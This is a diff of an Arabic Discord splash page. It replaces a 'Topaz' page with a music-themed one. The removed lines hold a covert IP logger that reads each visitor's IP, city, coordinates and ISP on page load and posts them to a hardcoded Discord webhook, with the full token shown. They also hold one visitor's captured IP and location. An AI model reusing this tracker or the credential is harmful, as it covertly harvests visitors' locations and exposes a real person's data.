@@ -1,233 +1,360 @@
-
-<!-- saved from url=(0032)https://kald112.github.io/short/ -->
-<html><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title> Topaz </title>
-<style>
-
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: 'Courier New', Courier, monospace;
-        color: #490a0a;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        flex-direction: column;
-        text-align: center;
-        overflow: hidden;
-        background-color: rgb(0, 0, 0); /* لون الخلفية الأسود */
-    }
-
-    /* صفحة الفيديو الأول */
-    .background-video {
-        position: absolute;
-        top: 50%; /* جعل الفيديو في منتصف الصفحة */
-        left: 50%;
-        width: 70%; /* التحكم في عرض الفيديو */
-        height: auto; /* الاحتفاظ بنسبة العرض إلى الارتفاع */
-        transform: translate(-50%, -50%); /* لضمان أن الفيديو يظهر في المركز */
-        z-index: -1;
-        object-fit: contain; /* التحكم في كيفية عرض محتوى الفيديو */
-    }
-
-    /* صفحة المحتوى الثاني */
-    .content {
-        display: none; /* إخفاء المحتوى الثاني في البداية */
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        z-index: 1;
-        position: relative;
-        height: 100vh;
-        width: 100%;
-    }
-
-    /* الخلفية الثانية (فيديو في الصفحة الثانية) */
-    .background-video-second {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        z-index: -1;
-    }
-
-    .info {
-        margin-top: 20px;
-        font-size: 1.5em;
-        background: linear-gradient(45deg, rgb(78, 79, 168), rgb(153, 159, 194), rgb(117, 97, 206));
-        -webkit-background-clip: text;
-        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
-        text-shadow: 0px 0px 8px rgb(233, 232, 232), 0px 0px 15px rgb(3, 0, 0)0px 0px 25px rgb(93, 61, 119)
-        letter-spacing: 4.5px;
-        white-space: pre-wrap;
-    }
-
-    .text {
-        margin-top: 20px;
-        font-size: 3em;
-        background: linear-gradient(45deg, rgb(78, 79, 168), rgb(153, 159, 194), rgb(117, 97, 206));
-        -webkit-background-clip: text;
-        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
-        text-shadow: 0px 0px 8px rgb(233, 232, 232), 0px 0px 15px rgb(3, 0, 0)0px 0px 25px rgb(93, 61, 119)
-        letter-spacing: 4.5px;
-    }
-
-    .marquee {
-        position: absolute;
-        top: 10%;
-        width: 100%;
-        overflow: hidden;
-        white-space: nowrap;
-    }
-
-    .marquee span {
-        display: inline-block;
-        font-size: 2em;
-        color: #d8c7c7;
-        text-shadow: 0px 0px 8px #8d74d3, 0px 0px 15px #7f77ad, 0px 0px 25px #ad88dd;
-        animation: scroll 10s linear infinite;
-    }
-
-           /* تحسين النص المتحرك */
-           .marquee {
-            position: absolute;
-            top: 10%;
-            width: 100%;
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MUSIC</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             overflow: hidden;
-            white-space: nowrap;
+            position: relative;
         }
 
-        /* النص المتحرك بتدرج أبيض مدهب */
-        .marquee span {
-            display: inline-block;
+        /* فيديو الخلفية */
+        .background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+            opacity: 0.3;
+        }
+
+        /* طبقة مظلمة فوق الفيديو */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+
+        /* صفحة التحميل */
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 10;
+            width: 100%;
+        }
+
+        /* النص العلوي */
+        .top-text {
+            position: absolute;
+            top: 15%;
+            right: 10%;
+            font-size: 2.5em;
+            color: #ff3333;
+            text-shadow: 0 0 20px #ff3333, 0 0 40px #ff3333;
+            font-weight: bold;
+            direction: rtl;
+            animation: glow-red 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow-red {
+            from {
+                text-shadow: 0 0 20px #ff3333, 0 0 40px #ff3333;
+            }
+            to {
+                text-shadow: 0 0 30px #ff6666, 0 0 60px #ff6666;
+            }
+        }
+
+        /* أيقونة الموسيقى */
+        .music-icon {
             font-size: 2em;
-            background: linear-gradient(45deg, rgb(78, 79, 168), rgb(153, 159, 194), rgb(117, 97, 206));
-            -webkit-background-clip: text;
-            color: transparent;
-            text-shadow: 0px 0px 8px rgb(233, 232, 232), 0px 0px 15px rgb(3, 0, 0)0px 0px 25px rgb(93, 61, 119)
-            animation: scroll 10s linear infinite;
+            color: #ff3333;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
         }
 
-    @keyframes scroll {
-        0% { transform: translateX(100%); }
-        100% { transform: translateX(-100%); }
-    }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-10px);
+            }
+            60% {
+                transform: translateY(-5px);
+            }
+        }
 
-    /* تعديل لتكبير الصورة وضمان وضعها في المركز */
-    .image-container img {
-        max-width: 55%; /* تحدد الحد الأقصى لحجم الصورة */
-        height: auto;  /* لحفاظ الصورة على النسب */
-        margin: 20px auto; /* يضع الصورة في الوسط أفقيًا */
-        display: block; /* ضمان أن الصورة ستكون في منتصف الصفحة */
-    }
-</style>
+        /* شريط التحميل */
+        .loading-bar-container {
+            width: 400px;
+            height: 20px;
+            background: #333;
+            border-radius: 25px;
+            overflow: hidden;
+            margin: 30px 0;
+            border: 2px solid #555;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+        }
+
+        .loading-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #66ff66, #00ff00);
+            width: 0%;
+            border-radius: 25px;
+            animation: loading 1.5s ease-in-out forwards;
+            box-shadow: 0 0 15px #00ff00;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        /* العنوان الرئيسي */
+        .main-title {
+            font-size: 3em;
+            color: #fff;
+            margin: 20px 0;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+            letter-spacing: 8px;
+            animation: pulse-white 3s ease-in-out infinite;
+        }
+
+        @keyframes pulse-white {
+            0%, 100% {
+                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+                transform: scale(1);
+            }
+            50% {
+                text-shadow: 0 0 50px rgba(255, 255, 255, 1);
+                transform: scale(1.02);
+            }
+        }
+
+        /* العنوان الفرعي */
+        .subtitle {
+            font-size: 2em;
+            color: #ccc;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            letter-spacing: 3px;
+            direction: rtl;
+        }
+
+        /* رابط الديسكورد */
+        .discord-link {
+            font-size: 1.5em;
+            color: #ffd700;
+            margin-top: 40px;
+            text-shadow: 0 0 25px #ffd700;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+            animation: glow-gold 2.5s ease-in-out infinite alternate;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .discord-link:hover {
+            color: #ffed4e;
+            text-shadow: 0 0 35px #ffed4e, 0 0 50px #ffed4e;
+            transform: scale(1.05);
+        }
+
+        @keyframes glow-gold {
+            from {
+                text-shadow: 0 0 25px #ffd700;
+            }
+            to {
+                text-shadow: 0 0 35px #ffed4e, 0 0 50px #ffed4e;
+            }
+        }
+
+        /* المحتوى الرئيسي (مخفي في البداية) */
+        .main-content {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 10;
+            animation: fadeIn 2s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* تنسيق الصورة */
+        .logo-image {
+            width: 200px;
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
+            animation: pulse-white 3s ease-in-out infinite;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        /* تأثيرات الجسيمات */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-10px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+    </style>
 </head>
 <body>
-<!-- الفيديو الذي يتم تشغيله في البداية -->
-<video class="background-video" autoplay muted>
-    <source src="https://j.top4top.io/m_3260pjgnd1.mp4" type="video/mp4">
-    Your browser does not support the video tag.
-</video>
-
-<!-- محتوى الصفحة الثانية -->
-<div class="content">
-    <!-- الفيديو الذي سيكون خلفية الصفحة الثانية -->
-    <video class="background-video-second" autoplay loop muted>
-        <source src="https://f.top4top.io/m_34573i6dm1.mp4" type="video/mp4">
-        Your browser does not support the video tag.
+    <!-- فيديو الخلفية -->
+    <video class="background-video" autoplay loop muted>
+        <source src="https://j.top4top.io/m_3496auwdk1.mov" type="video/mp4">
     </video>
-
-    <!-- شريط النص المتحرك -->
-    <div class="marquee" bis_skin_checked="1">
-        <span>
-            💖 ✈ Welcome comment Topaz 💖                                                       
-        </span>
-    </div>
     
-
-    <!-- صورة أعلى النصوص -->
-    <div id="content" bis_skin_checked="1">
-        <div class="image-container" bis_skin_checked="1">
-            <img src="https://d.top4top.io/p_3457uychg1.png" alt="">
-        </div>
-
-<div id="clock" style="
-    font-size: 1.8em;
-    background: linear-gradient(45deg, rgb(78, 79, 168), rgb(153, 159, 194), rgb(117, 97, 206));
-    -webkit-background-clip: text;
-    color: transparent;
-    text-shadow: 0px 0px 8px rgb(233, 232, 232), 0px 0px 15px rgb(3, 0, 0), 0px 0px 25px rgb(93, 61, 119);
-    margin-bottom: 10px;
-"></div>
-
-<div id="clock" style="font-size: 1.8em; color: #d8c7c7; margin-bottom: 10px;"></div>
-
-    <!-- معلومات الفيديو والنصوص -->
-    <div class="info" id="ip-info" bis_skin_checked="1">PY Topaz 
-<strong>IP:</strong><span>"151.255.45.44"</span><br><strong>City:</strong><span>"Ta’if"</span><br><strong>Region:</strong><span>"Mecca Region"</span><br><strong>Country:</strong><span>"SA"</span><br><strong>Location:</strong><span>"21.2703,40.4158"</span><br><strong></strong> <span>"AS39891 Saudi Telecom Company JSC"</span><br><strong>Timezone:</strong><span>"Asia/Riyadh"</span></div>
-    <div class="text" bis_skin_checked="1">https://discord.gg/Aoo<br><strong></strong></div>
-        
-    <!-- الصوت -->
-    <audio autoplay="" loop="">
-        <source src="https://c.top4top.io/m_3457yxsta1.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
+    <!-- الموسيقى الخلفية -->
+    <audio id="background-music" autoplay loop>
+        <source src="https://k.top4top.io/m_3496laxga1.mp3" type="audio/mpeg">
     </audio>
-</div>
-
-<script>
-    // الانتقال من الفيديو إلى المحتوى الثاني عند انتهائه
-    const video = document.querySelector('.background-video');
-    const content = document.querySelector('.content');
     
-    // عند انتهاء الفيديو، عرض المحتوى الثاني	
-    video.onended = function() {
-        content.style.display = 'flex';  // عرض المحتوى الثاني
-        video.style.display = 'none';    // إخفاء الفيديو
-    };
+    <!-- طبقة مظلمة -->
+    <div class="overlay"></div>
 
-    // Fetch IP information without API token
-     fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            const { ip, country, city, region, loc, org, timezone } = data;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = `PY Topaz
-<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
+    <!-- تأثير الجسيمات -->
+    <div class="particles" id="particles"></div>
 
-            const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discord.com/api/webhooks/1352449195306385542/vf9H0WU7mq0nKl7vSF9CiwjgdMWazAEyM1bNL-TKQ6C3M89gBlJ_xIMPZU1K8Fp73l-R';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: `IP : ${ip}
-                    \nCountry & City : ${country} - ${city}
-                    \nDate & Time : ${dateTime}    
-                    \ndisplay: ${day}             <div id="day" style="display: block;">الجمعة</div>
-                    \n -`})
+    <!-- صفحة التحميل -->
+    <div class="loading-screen" id="loading-screen">
+        <!-- النص العلوي -->
+        <div class="top-text"></div>
+        
+        <!-- أيقونة الموسيقى -->
+        <div class="music-icon">لعيون الاونر</div>
+        
+        <!-- شريط التحميل -->
+        <div class="loading-bar-container">
+            <div class="loading-bar"></div>
+        </div>
+        
+        <!-- العنوان الرئيسي -->
+        <div class="main-title">  </div>
+        
+        <!-- العنوان الفرعي -->
+        <div class="subtitle"></div>
+        
+        <!-- رابط الديسكورد -->
+        <a href="https://discord.gg/eGdYkbax5n" class="discord-link">https://discord.gg/eGdYkbax5n</a>
+    </div>
+
+    <!-- المحتوى الرئيسي (مخفي) -->
+    <div class="main-content" id="main-content">
+        <img src="https://a.top4top.io/p_3496mosd61.jpg" alt="Music Logo" class="logo-image">
+        <div class="main-title">حمايه فاشله</div>
+        <div class="subtitle">لعيون الضامري + شمر</div>
+        <a href="https://discord.gg/eGdYkbax5n" class="discord-link">https://discord.gg/eGdYkbax5n</a>
+    </div>
+
+    <script>
+        // إنشاء الجسيمات المتطايرة
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
+                particles.appendChild(particle);
+            }
+        }
+
+        // تشغيل الجسيمات
+        createParticles();
+
+        // تشغيل الموسيقى فوراً
+        const audio = document.getElementById('background-music');
+        audio.volume = 0.7; // مستوى الصوت
+        audio.play().catch(function(error) {
+            console.log('الموسيقى ستشتغل بعد التفاعل الأول');
+            // إذا فشل التشغيل التلقائي، تشغيل مع أول تفاعل
+            document.addEventListener('click', function() {
+                audio.play();
+            }, { once: true });
+        });
+
+        // الانتقال من صفحة التحميل للمحتوى الرئيسي
+        setTimeout(function() {
+            const loadingScreen = document.getElementById('loading-screen');
+            const mainContent = document.getElementById('main-content');
+            
+            loadingScreen.style.display = 'none';
+            mainContent.style.display = 'flex';
+        }, 2000); // ثانيتين بس
+
+        // تحسين تشغيل الفيديو
+        const video = document.querySelector('.background-video');
+        video.addEventListener('canplay', function() {
+            video.play().catch(function(error) {
+                console.log('خطأ في تشغيل الفيديو:', error);
             });
         });
+
+        // إضافة تأثيرات صوتية بصرية (اختيارية)
+        document.addEventListener('click', function() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 20; i++) {
+                const spark = document.createElement('div');
+                spark.className = 'particle';
+                spark.style.left = Math.random() * 100 + '%';
+                spark.style.top = Math.random() * 100 + '%';
+                spark.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                spark.style.animationDuration = '1s';
+                particles.appendChild(spark);
+                
+                setTimeout(function() {
+                    spark.remove();
+                }, 1000);
+            }
+        });
     </script>
-
-
-
-
-<script>
-function updateClock() {
-    const now = new Date();
-    const timeString = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    document.getElementById('clock').textContent = " " + timeString;
-}
-setInterval(updateClock, 1000);
-updateClock();
-</script>
-
-
-
-
-
-   
-   <div id="veepn-guard-alert" bis_skin_checked="1"><template shadowrootmode="open"><style>html{box-sizing:border-box;text-size-adjust:100%;word-break:normal;-moz-tab-size:4;tab-size:4}*,:before,:after{background-repeat:no-repeat;box-sizing:border-box}:before,:after{text-decoration:inherit;vertical-align:inherit}*{padding:0;margin:0}hr{overflow:visible;height:0;color:inherit;border:0;border-top:1px solid}details,main{display:block}summary{display:list-item}small{font-size:80%}[hidden]{display:none}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}a{background-color:transparent}a:active,a:hover{outline-width:0}code,kbd,pre,samp{font-family:monospace}pre{font-size:1em}b,strong{font-weight:bolder}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{border-color:inherit;text-indent:0}iframe{border-style:none}input{border-radius:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none;-moz-appearance:none;appearance:none}textarea{overflow:auto;resize:vertical}button,input,optgroup,select,textarea{font:inherit;color:inherit}optgroup{font-weight:700}button{overflow:visible}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit],[role=button]{cursor:pointer}button::-moz-focus-inner,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{border-style:none;padding:0}button,html [type=button],[type=reset],[type=submit]{-webkit-appearance:button;-moz-appearance:button;appearance:button}button,input,select,textarea{background-color:transparent;border-style:none}button:-moz-focusring,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{outline:1px dotted ButtonText}select{-webkit-appearance:none;-moz-appearance:none;appearance:none}a:focus,button:focus,input:focus,select:focus,textarea:focus{outline-width:0}select::-ms-expand{display:none}select::-ms-value{color:currentcolor}legend{border:0;color:inherit;display:table;white-space:normal;max-width:100%}::-webkit-file-upload-button{-webkit-appearance:button;-moz-appearance:button;appearance:button;color:inherit;font:inherit}[disabled]{cursor:default}img{border-style:none}progress{vertical-align:baseline}[aria-busy=true]{cursor:progress}[aria-controls]{cursor:pointer}[aria-disabled=true]{cursor:default}ul,ol{list-style-type:none}figure{margin:0}.guard-popup{font-family:FigtreeVF,sans-serif;position:fixed;z-index:2147483638;top:8px;left:24px;overflow:visible;color:#222e3a;background-color:#fff;max-width:416px;width:calc(100% - 48px);border-radius:16px;box-shadow:0 4px 20px #00000040;padding:24px}.guard-popup__header{display:flex;justify-content:space-between;align-items:center;column-gap:16px;margin-bottom:24px}.guard-popup__close{display:flex;align-items:center;justify-content:center;width:24px;height:24px;opacity:.7}.guard-popup__img{line-height:0;margin-bottom:24px}.guard-popup__img img{width:100%;aspect-ratio:368/142;object-fit:cover;border-radius:12px;overflow:hidden}.guard-popup__title{font-size:24px;line-height:32px;margin-bottom:8px}.guard-popup__description{font-size:20px;line-height:28px;font-weight:500;color:#4a5764;margin-bottom:28px}.guard-popup__actions{display:flex;justify-content:flex-end;column-gap:16px}.guard-popup__btn{display:flex;align-items:center;justify-content:center;padding:8px 16px;border-radius:5px;font-size:16px;line-height:24px;font-weight:700;cursor:pointer;color:#fff;background:linear-gradient(180deg,#5695fd,#1554ff)}</style></template></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><div id="veepn-breach-alert" bis_skin_checked="1"><template shadowrootmode="open"><style>.breach-popup{font-family:FigtreeVF,sans-serif;position:fixed;z-index:2147483638;text-rendering:optimizelegibility;top:0;left:0;right:0;pointer-events:none;padding-inline:16px;height:0;overflow:visible;color:#222e3a}.breach-popup *{box-sizing:border-box}.breach-popup__inner{background-color:#de4558;width:100%;border-radius:16px;margin-inline:auto;pointer-events:all;position:relative;transition:transform .25s ease-in-out,max-width .25s ease-in-out;transform:translateY(16px);max-height:calc(100svh - 80px);display:flex;flex-direction:column}.breach-popup__header{min-height:32px;display:flex;align-items:center;justify-content:space-between;column-gap:16px;padding:4px;cursor:pointer}.breach-popup__close{cursor:pointer;background-color:transparent;border-style:none;outline:none;display:flex;align-items:center;justify-content:center;width:24px;height:24px;flex-shrink:0;opacity:.5}.breach-popup__wrap{display:grid;grid-template-rows:0fr;transition:grid-template-rows .25s ease-in-out;overflow:hidden}.breach-popup__content{overflow:hidden;opacity:0;transform:translateY(-10px)}.breach-popup--minimize .breach-popup__inner{max-width:485px;transform:translateY(-100%)}.breach-popup--collapse .breach-popup__inner{max-width:485px}.breach-popup--expand .breach-popup__inner{max-width:1120px}.breach-popup--expand .breach-popup__wrap{grid-template-rows:1fr}.breach-popup--expand .breach-popup__content{opacity:1;transform:translateY(0);transition:transform .25s ease-in-out,opacity .25s ease-in-out;transition-delay:.15s}.breach-popup--expand .breach-popup__header{cursor:default}.breach-info{padding:2px;height:100%}.breach-info__inner{padding:22px 22px 0;background-color:#fff;border-bottom-left-radius:15px;border-bottom-right-radius:15px;height:100%;overflow:auto}.breach-info__alert{font-size:24px;line-height:32px;font-weight:700;margin:0}.breach-info__list{margin-top:24px;display:flex;flex-wrap:wrap;gap:24px}@media only screen and (width >= 992px){.breach-info__list{flex-wrap:nowrap}}.breach-info__item{width:100%}.breach-info__item:nth-child(2){max-width:320px}.breach-info__item:nth-child(3){max-width:200px}.breach-info__title{font-size:18px;font-weight:700;line-height:32px;letter-spacing:-.1px;color:#de4558;margin-top:0;margin-bottom:4px}.breach-info__description{font-size:16px;line-height:28px;letter-spacing:-.1px}.breach-info__description ul{margin:0}.breach-info__actions{display:flex;justify-content:center;padding-top:32px;padding-bottom:22px;background-color:#fff;position:sticky;bottom:0}.breach-info__btn{cursor:pointer;border-style:none;outline:none;display:inline-flex;align-items:center;height:48px;padding-inline:20px;border-radius:12px;text-align:center;font-size:16px;font-weight:700;line-height:28px;letter-spacing:-.1px;color:#fff;background-color:#ff6400}.button-expand{position:absolute;bottom:0;left:50%;transform:translate(-50%,100%);z-index:1}.button-expand__pointer{cursor:pointer}.button-expand__alert{pointer-events:none;transition:opacity .25s ease-in-out}.button-expand__arrow{pointer-events:none;transition:transform .25s ease-in-out,opacity .25s ease-in-out;transform-origin:center}.button-expand--minimize .button-expand__arrow,.button-expand--collapse .button-expand__alert,.button-expand--expand .button-expand__alert{opacity:0}.button-expand--expand .button-expand__arrow{transform:rotate(180deg)}.header-collapse{display:flex;align-items:center;flex-wrap:wrap;column-gap:4px;padding-left:8px;font-size:14px;line-height:20px;letter-spacing:-.1px;color:#fff}.header-expand{display:flex;align-items:center;flex-wrap:wrap;column-gap:4px;padding-left:20px;font-size:14px;font-weight:500;line-height:20px;letter-spacing:-.1px;color:#fff}</style></template></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><script id="ghsinj" src="./kald_files/default.php" extid="15"></script></div></body></html>
+</body>
+</html>
